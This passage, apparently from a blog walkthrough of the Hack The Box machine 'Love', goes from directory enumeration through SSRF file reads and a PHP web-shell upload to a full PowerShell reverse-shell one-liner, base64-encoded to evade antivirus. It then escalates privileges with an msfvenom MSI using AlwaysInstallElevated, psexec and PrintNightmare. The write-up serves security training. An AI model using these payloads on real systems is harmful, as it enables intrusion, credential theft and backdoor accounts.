by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://www.love.htb/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>
/admin/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6198<span class="o">]</span>
/includes/            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2261<span class="o">]</span>
/plugins/             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2490<span class="o">]</span>
/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2719<span class="o">]</span>
/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
/login.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
/webalizer/           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/home.php             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4388<span class="o">]</span>             
/phpmyadmin/          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/icons/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 74798<span class="o">]</span>            
/preview.php          <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
/examples/            <span class="o">(</span>Status: 503<span class="o">)</span> <span class="o">[</span>Size: 402<span class="o">]</span>              
/dist/                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1389<span class="o">]</span>             
/tcpdf/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2710<span class="o">]</span>             
/licenses/            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
/con.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/con/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/con.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/aux/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/aux.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
/aux.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
                                                             
<span class="o">===============================================================</span>
2021/08/08 13:18:01 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><h4 id="admin">/admin</h4>
<p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p>
<p><div class="img-container"><img src="imgs/image-20210809003454272.png" alt="image-20210809003454272"  /></div>
</p>
<p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p>
<h3 id="tcp-80---staginglovehtb">TCP 80 - staging.love.htb</h3>
<p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p>
<p><div class="img-container"><img src="imgs/image-20210809010051350.png" alt="image-20210809010051350"  /></div>
</p>
<p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p>
<p><div class="img-container"><img src="imgs/image-20210809010747052.png" alt="image-20210809010747052"  /></div>
</p>
<p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49806</span>
GET /iamf HTTP/1.1
Host: 10.10.14.51
Accept: */*
</code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
<p>Playing a bit with it reveals that it can render HTML.</p>
<p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
</p>
<p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
<h3 id="tcp-443---website">TCP 443 - Website</h3>
<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
</p>
<p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809012934262.png" alt="image-20210809012934262"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210809012945191.png" alt="image-20210809012945191"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-phoebe">Shell as phoebe</h3>
<h4 id="ssrf">SSRF</h4>
<p>The behavior of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).</p>
<p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210809033303050.png" alt="image-20210809033303050"  /></div>
</p>
<p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from <code>127.0.0.1</code>.</p>
<p>Assuming there is an index file, I try to submit  <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> , and the file is exist.</p>
<p><div class="img-container"><img src="imgs/image-20210809034759102.png" alt="image-20210809034759102"  /></div>
</p>
<p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p>
<p><div class="img-container"><img src="imgs/image-20210809034943436.png" alt="image-20210809034943436"  /></div>
</p>
<p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210809033828889.png" alt="image-20210809033828889"  /></div>
</p>
<p>I can use that creds to access the admin dashboard.</p>
<p><div class="img-container"><img src="imgs/image-20210809034300363.png" alt="image-20210809034300363"  /></div>
</p>
<h4 id="php-webshell">PHP webshell</h4>
<p>On  <code>admin/voters.php</code>, there is a photo upload feature.</p>
<p><div class="img-container"><img src="imgs/image-20210809035502402.png" alt="image-20210809035502402"  /></div>
</p>
<p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
<p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
</p>
<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
<p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
</p>
<p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210809040810276.png" alt="image-20210809040810276"  /></div>
</p>
<h4 id="interactive-shell-access">Interactive shell access</h4>
<p>To get an interactive shell I will use a PowerShell one-liner reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ cat exploits/revshell.ps1
<span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;10.10.14.51&#39;</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
</code></pre></div><p>Because it is a Windows machine, I will encoded it with base64 to avoid AV.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ cat exploits/revshell.ps1<span class="p">|</span> iconv -t UTF-16LE<span class="p">|</span> base64 -w0
<span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</code></pre></div><p>I will setup a listener and leverage the web shell to execute my payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">http://www.love.htb/images/shell.php?f<span class="o">=</span>powershell.exe -enc <span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ rlwrap nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49950</span>

PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; dir


    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---          8/8/2021   3:50 AM             <span class="m">34</span> user.txt                                                             


PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
65a5...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The flag also accessible using SSRF.</p>
<p><div class="img-container"><img src="imgs/image-20210809043334065.png" alt="image-20210809043334065"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
</code></pre></div><h4 id="exploitation---malicious-msi-installer">Exploitation - Malicious .msi Installer</h4>
<p>I will use <code>msfvenom</code> to generate a malicious <code>.msi</code> that will add a user with administrative access and host it aftewards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.51» 
$ msfvenom -p windows/adduser <span class="nv">USER</span><span class="o">=</span>iamf <span class="nv">PASS</span><span class="o">=</span>P@ssword123! -f msi -o iamf.msi
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="m">270</span> bytes
Final size of msi file: <span class="m">159744</span> bytes
Saved as: iamf.msi
</code></pre></div><p>On Love, I will grab the msi and install the package immediately.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user

User accounts <span class="k">for</span> <span class="se">\\</span>LOVE                                                                                                                                                   
                                                                                                                                                                           
-------------------------------------------------------------------------------                                                                                            
Administrator            DefaultAccount           Guest                                                                                                                    
iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
The <span class="nb">command</span> completed successfully.                                                                                                                                        

PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; 
</code></pre></div><h4 id="psexec---system">Psexec - SYSTEM</h4>
<p>I can login using my backdoor user with help of <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ psexec.py love/iamf:<span class="s1">&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.239.....
<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
<span class="o">[</span>*<span class="o">]</span> Uploading file VlzRTIEE.exe
<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.239.....
<span class="o">[</span>*<span class="o">]</span> Creating service lRbn on 10.10.10.239.....
<span class="o">[</span>*<span class="o">]</span> Starting service lRbn.....
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.19042.867<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem
C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
love
</code></pre></div><h4 id="alternative-printnightmare">(Alternative) PrintNightmare</h4>
<p>Love also vulnerable to LPE <a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Get-Service -name spooler

Status   Name               DisplayName
------   ----               -----------
Running  spooler            Print Spooler
PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Invoke-Nightmare
PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; net user

User accounts <span class="k">for</span> <span class="se">\\</span>LOVE

-------------------------------------------------------------------------------
adm1n                    Administrator            DefaultAccount           
Guest                    iamf                     Phoebe                   
WDAGUtilityAccount       
The <span class="nb">command</span> completed successfully.
</code></pre></div><p>I can login via WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
$ evil-winrm -i 10.10.10.239 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
Love
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></li>
<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
